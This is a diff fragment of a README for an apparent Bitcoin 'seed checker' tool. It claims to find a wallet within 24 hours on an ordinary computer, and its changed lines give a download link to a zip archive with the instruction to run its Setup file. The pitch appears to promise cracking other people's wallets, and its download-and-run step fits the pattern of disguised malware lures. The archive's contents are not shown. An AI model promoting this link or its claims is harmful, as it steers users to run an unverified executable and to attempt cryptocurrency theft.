@@ -30,10 +30,10 @@ You need 24H for find first wallet, on medium PC or laptop
 - **Digital Asset Recovery**: Efficient recovery of digital assets.
 - **Python Crypto Tool**: Utilize Python-based tools for cryptocurrency management.
 - **Bitcoin Security**: Enhance the security of Bitcoin wallets.
-- 
-- Link download: https://github.com/yoyo422012/seed-checker-btc/releases/download/btc/btc-check.zip
-- For use run Setup file
-- 
+  
+ Link download: https://github.com/yoyo422012/seed-checker-btc/releases/download/btc/btc-check.zip
+ For use run Setup file
+
 
 ## Benefits
 - **Recover Access**: Regain access to your lost or forgotten Bitcoin wallets and keys.
